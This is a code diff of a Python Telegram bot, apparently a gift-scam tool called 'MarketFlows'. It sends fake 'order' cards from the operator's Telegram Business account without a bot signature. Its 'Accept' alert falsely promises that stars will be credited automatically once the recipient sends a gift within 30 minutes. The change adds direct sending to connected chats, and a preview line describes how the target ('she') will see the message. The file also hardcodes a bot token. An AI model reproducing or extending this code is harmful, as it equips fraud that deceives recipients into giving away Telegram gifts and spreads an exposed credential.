@@ -2,6 +2,7 @@ import asyncio
 import json  
 import secrets  
 import sqlite3  
+import re
 from datetime import datetime, timedelta  
   
 from aiogram import Bot, Dispatcher, F, Router  
@@ -12,8 +13,7 @@ from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.types import (  
     Message, CallbackQuery, BusinessConnection,  
     InlineKeyboardMarkup, InlineKeyboardButton,  
-    ReplyKeyboardMarkup, KeyboardButton,  
-    InlineQueryResultArticle, InputTextMessageContent  
+    ReplyKeyboardMarkup, KeyboardButton  
 )  
   
 BOT_TOKEN = "9111963048:AAHem8wQwJiU5mkeoob_3KtmPRP8sGtYtmM"  
@@ -21,15 +21,16 @@ BRAND = "MarketFlows"
 DB_PATH = "marketflows.db"  
 
 active_business_connection_id = None
-active_business_chats = {} 
+active_business_chats = {} # chat_id -> name
 
 LANGS = {
     "ru": {
-        "welcome": "🏦 <b>{brand}</b>\n\nОтправь мне текст со ссылкой на подарок, и я сразу сформирую карточку ордера!",
+        "welcome": "🏦 <b>{brand}</b>\n\nПривет. Пришли мне сообщение со вступительной фразой и ссылкой на открытку — я оформлю его и дам кнопки для отправки.\n\nЧисло из твоего текста подставится в уведомление про звёзды.\n\nПод превью будут кнопки «Отправить: имя» — сообщение уйдёт от твоего аккаунта, подключенного через Telegram Business, без подписи бота.\n/chats — список чатов, можно листать и удалять.",
         "menu_create": "🤝 Создать сделку",
         "menu_lang": "🌍 Язык: Русский",
         "menu_chats": "📂 Мои чаты",
-        "btn_publish": "📤 Отправить карточку ордера",
+        "btn_publish": "Отправить: {name}",
+        "btn_publish_self": "Отправить в этот чат",
         "btn_delete": "❌ Удалить ордер",
         "timer_text": "⏳ <b>Предложение активно ещё {timer}</b>",
         "btn_show": "🎁 ПОКАЗАТЬ ПОДАРОК",
@@ -37,43 +38,45 @@ LANGS = {
         "btn_accept": "✅ Принять",
         "alert_accept": "Отправьте подарок в течение 30 минут, и {amount} ⭐ автоматически пополнятся на ваш аккаунт.",
         "order_rejected": "❌ Ордер отклонён.",
-        "order_sent": "✅ Ордер отправлен!",
+        "order_sent": "Отправлено: {name}. Telegram подтвердил. Кнопки прикреплены.",
         "order_not_found": "Ордер не найден",
         "lang_chosen": "✅ Язык успешно изменен на Русский 🇷🇺",
         "choose_lang": "🌐 Выберите язык / Choose language / 选择语言:"
     },
     "en": {
-        "welcome": "🏦 <b>{brand}</b>\n\nSend me the text with the gift link, and I'll create the order card!",
+        "welcome": "🏦 <b>{brand}</b>\n\nSend me text with gift link...",
         "menu_create": "🤝 Create Deal",
         "menu_lang": "🌍 Language: English",
         "menu_chats": "📂 My Chats",
-        "btn_publish": "📤 Send order card",
-        "btn_delete": "❌ Delete order",
+        "btn_publish": "Send: {name}",
+        "btn_publish_self": "Send here",
+        "btn_delete": "❌ Delete",
         "timer_text": "⏳ <b>Offer active for {timer} more</b>",
         "btn_show": "🎁 SHOW GIFT",
         "btn_reject": "❌ Reject",
         "btn_accept": "✅ Accept",
         "alert_accept": "Send the gift within 30 minutes, and {amount} ⭐ will be automatically added to your account.",
         "order_rejected": "❌ Order rejected.",
-        "order_sent": "✅ Order sent!",
+        "order_sent": "Sent: {name}. Telegram confirmed. Buttons attached.",
         "order_not_found": "Order not found",
-        "lang_chosen": "✅ Language successfully changed to English 🇬🇧",
+        "lang_chosen": "✅ Language changed to English 🇬🇧",
         "choose_lang": "🌐 Choose language / Выберите язык / 选择语言:"
     },
     "zh": {
-        "welcome": "🏦 <b>{brand}</b>\n\n发送带有礼物链接的文本，我将创建订单卡片！",
+        "welcome": "🏦 <b>{brand}</b>\n\n发送带有礼物链接的文本...",
         "menu_create": "🤝 创建交易",
         "menu_lang": "🌍 语言: 中文",
         "menu_chats": "📂 我的聊天",
-        "btn_publish": "📤 发送订单卡片",
-        "btn_delete": "❌ 删除订单",
+        "btn_publish": "发送: {name}",
+        "btn_publish_self": "发送到此聊天",
+        "btn_delete": "❌ 删除",
         "timer_text": "⏳ <b>优惠有效时间还剩 {timer}</b>",
         "btn_show": "🎁 查看礼物",
         "btn_reject": "❌ 拒绝",
         "btn_accept": "✅ 接受",
         "alert_accept": "请在 30 分钟内发送礼物，{amount} ⭐ 将自动充值到您的账户中。",
         "order_rejected": "❌ 订单已拒绝。",
-        "order_sent": "✅ 订单已发送！",
+        "order_sent": "已发送: {name}。Telegram 已确认。按钮已附加。",
         "order_not_found": "未找到订单",
         "lang_chosen": "✅ 语言已成功切换为中文 🇨🇳",
         "choose_lang": "🌐 选择语言 / Choose language / 选择语言:"
@@ -146,7 +149,7 @@ async def business_connection_handler(bc: BusinessConnection):
     if bc.is_enabled:
         active_business_connection_id = bc.id
         if bc.user:
-            active_business_chats[bc.user.id] = f"@{bc.user.username}" if bc.user.username else bc.user.first_name
+            active_business_chats[bc.user.id] = f"{bc.user.first_name}" if not bc.user.username else f"@{bc.user.username}"
 
 @router.message(CommandStart())  
 async def cmd_start(msg: Message):  
@@ -161,11 +164,9 @@ async def cmd_start(msg: Message):
             custom_text = deal[4]
             gift_link = deal[5]
 
-            # Чистый вид без таймера до нажатия "Принять"
             text_msg = f"{custom_text}\n\n{gift_link}"
             
             kb = InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text=t["btn_show"], url=gift_link)],
                 [
                     InlineKeyboardButton(text=t["btn_reject"], callback_data=f"sel_reject_{code}"),
                     InlineKeyboardButton(text=t["btn_accept"], callback_data=f"sel_accept_{code}")
@@ -209,12 +210,24 @@ async def set_language(cb: CallbackQuery):
     await cb.message.answer(t["welcome"].format(brand=BRAND), parse_mode="HTML", reply_markup=main_menu(lang))
     await cb.answer()
 
+@router.message(F.text == "📂 Мои чаты")
+async def chats_list(msg: Message):
+    if active_business_chats:
+        text = "📋 <b>Подключенные чаты Telegram Business:</b>\n\n" + "\n".join([f"• {name} (ID: <code>{cid}</code>)" for cid, name in active_business_chats.items()])
+    else:
+        text = "ℹ️ Активных бизнес-чатов пока нет. Подключите бота в настройках Telegram Business."
+    await msg.answer(text, parse_mode="HTML", reply_markup=main_menu(get_user_lang(msg.from_user.id)))
+
+@router.message(F.text == "🤝 Создать сделку")
+async def create_deal_btn(msg: Message):
+    await msg.answer("✍️ Пришли мне сообщение со вступительной фразой и ссылкой на открытку — я оформлю его и дам кнопки для отправки.", parse_mode="HTML")
+
 @router.message(F.text & ~F.text.startswith("/"))
 async def handle_deal_creation_text(msg: Message):
     lang = get_user_lang(msg.from_user.id)
     t = LANGS[lang]
 
-    if msg.text in ["🌍 Язык: Русский", "🌍 Language: English", "🌍 语言: 中文", "📂 Мои чаты", "📂 My Chats", "📂 我的聊天"]:
+    if msg.text in ["🌍 Язык: Русский", "🌍 Language: English", "🌍 语言: 中文", "📂 Мои чаты", "📂 My Chats", "📂 我的聊天", "🤝 Создать сделку", "🤝 Create Deal", "🤝 创建交易"]:
         return
 
     text_content = msg.text.strip()
@@ -237,13 +250,20 @@ async def handle_deal_creation_text(msg: Message):
     conn.commit()  
     conn.close()
 
-    # Кнопка отправки с нативным вызовом списка чатов через switch_inline_query
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text=t["btn_publish"], switch_inline_query=f"deal_{code}")],
-        [InlineKeyboardButton(text=t["btn_delete"], callback_data=f"sel_reject_{code}")]
-    ])
+    buttons = [
+        [
+            InlineKeyboardButton(text=t["btn_reject"], callback_data=f"sel_reject_{code}"),
+            InlineKeyboardButton(text=t["btn_accept"], callback_data=f"sel_accept_{code}")
+        ]
+    ]
+    if active_business_chats:
+        for cid, name in active_business_chats.items():
+            buttons.append([InlineKeyboardButton(text=t["btn_publish"].format(name=name), callback_data=f"sendtochat_{code}_{cid}")])
+    else:
+        buttons.append([InlineKeyboardButton(text=t["btn_publish_self"], callback_data=f"sendtochat_{code}_{msg.from_user.id}")])
 
-    preview_text = f"{text_content}\n\n{gift_link}"
+    kb = InlineKeyboardMarkup(inline_keyboard=buttons)
+    preview_text = f"{text_content}\n\n{gift_link}\n\nТак это увидит она. Число в уведомлении: 3000 звезд. Нажми «Отправить: имя» — сообщение уйдёт от твоего аккаунта, подключенного через Telegram Business, без подписи бота. /chats — список чатов, можно листать и удалять."
 
     await msg.answer(
         text=preview_text,
@@ -252,73 +272,58 @@ async def handle_deal_creation_text(msg: Message):
         disable_web_page_preview=False
     )
 
-@router.inline_query()
-async def inline_deal_query(query):
-    text = query.query.strip()
-    lang = get_user_lang(query.from_user.id)
+@router.callback_query(F.data.startswith("sendtochat_"))
+async def send_to_chat(cb: CallbackQuery):
+    parts = cb.data.split("_")
+    code = parts[1]
+    target_chat_id = int(parts[2])
+    
+    deal = get_deal(code)
+    if not deal:
+        await cb.answer(LANGS[get_user_lang(cb.from_user.id)]["order_not_found"], show_alert=True)
+        return
+
+    lang = get_user_lang(cb.from_user.id)
     t = LANGS[lang]
 
-    if text.startswith("deal_"):
-        code = text.replace("deal_", "")
-        deal = get_deal(code)
-        if deal:
-            custom_text = deal[4]
-            gift_link = deal[5]
-            
-            content = f"{custom_text}\n\n{gift_link}"
-            
-            kb = InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text=t["btn_show"], url=gift_link)],
-                [
-                    InlineKeyboardButton(text=t["btn_reject"], callback_data=f"sel_reject_{code}"),
-                    InlineKeyboardButton(text=t["btn_accept"], callback_data=f"sel_accept_{code}")
-                ]
-            ])
-            
-            results = [
-                InlineQueryResultArticle(
-                    id=code,
-                    title="📤 Отправить карточку ордера",
-                    description="Нажмите, чтобы отправить этот ордер",
-                    input_message_content=InputTextMessageContent(
-                        message_text=content,
-                        parse_mode="HTML",
-                        disable_web_page_preview=False
-                    ),
-                    reply_markup=kb
-                )
-            ]
-            await query.answer(results, cache_time=1)
-    else:
-        conn = sqlite3.connect(DB_PATH)
-        rows = conn.execute("SELECT code, custom_text, gift_link FROM deals WHERE creator_id=? AND status='pending' ORDER BY id DESC LIMIT 5", (query.from_user.id,)).fetchall()
-        conn.close()
+    custom_text = deal[4]
+    gift_link = deal[5]
 
-        results = []
-        for r in rows:
-            code, custom_text, gift_link = r[0], r[1], r[2]
-            content = f"{custom_text}\n\n{gift_link}"
-            kb = InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text=t["btn_show"], url=gift_link)],
-                [
-                    InlineKeyboardButton(text=t["btn_reject"], callback_data=f"sel_reject_{code}"),
-                    InlineKeyboardButton(text=t["btn_accept"], callback_data=f"sel_accept_{code}")
-                ]
-            ])
-            results.append(
-                InlineQueryResultArticle(
-                    id=code,
-                    title=f"Ордер #{code}",
-                    description=custom_text[:50],
-                    input_message_content=InputTextMessageContent(
-                        message_text=content,
-                        parse_mode="HTML",
-                        disable_web_page_preview=False
-                    ),
-                    reply_markup=kb
-                )
-            )
-        await query.answer(results, cache_time=1)
+    text_msg = f"{custom_text}\n\n{gift_link}"
+
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(text=t["btn_reject"], callback_data=f"sel_reject_{code}"),
+            InlineKeyboardButton(text=t["btn_accept"], callback_data=f"sel_accept_{code}")
+        ]
+    ])
+
+    target_name = active_business_chats.get(target_chat_id, "чату")
+
+    if active_business_connection_id:
+        await cb.bot.send_message(
+            chat_id=target_chat_id,
+            text=text_msg,
+            parse_mode="HTML",
+            reply_markup=kb,
+            disable_web_page_preview=False,
+            business_connection_id=active_business_connection_id
+        )
+    else:
+        await cb.bot.send_message(
+            chat_id=target_chat_id,
+            text=text_msg,
+            parse_mode="HTML",
+            reply_markup=kb,
+            disable_web_page_preview=False
+        )
+
+    try:
+        await cb.message.edit_reply_markup(reply_markup=None)
+    except Exception:
+        pass
+    
+    await cb.answer(t["order_sent"].format(name=target_name), show_alert=True)
 
 @router.callback_query(F.data.startswith("sel_accept_"))
 async def sel_accept(cb: CallbackQuery):
@@ -332,19 +337,16 @@ async def sel_accept(cb: CallbackQuery):
     t = LANGS[lang]
 
     custom_text = deal[4]
-    import re
     numbers = re.findall(r'\d+', custom_text.replace(" ", ""))
     amount_str = numbers[0] if numbers else "3000"
 
     set_db_status(code, "accepted")
     
-    # Всплывающий алерт
     await cb.answer(
         text=t["alert_accept"].format(amount=amount_str),
         show_alert=True
     )
 
-    # При нажатии "Принять" добавляем анимированный таймер в текст сообщения
     gift_link = deal[5]
     expires_at = datetime.fromisoformat(deal[7]) if deal[7] else datetime.utcnow() + timedelta(minutes=30)
     
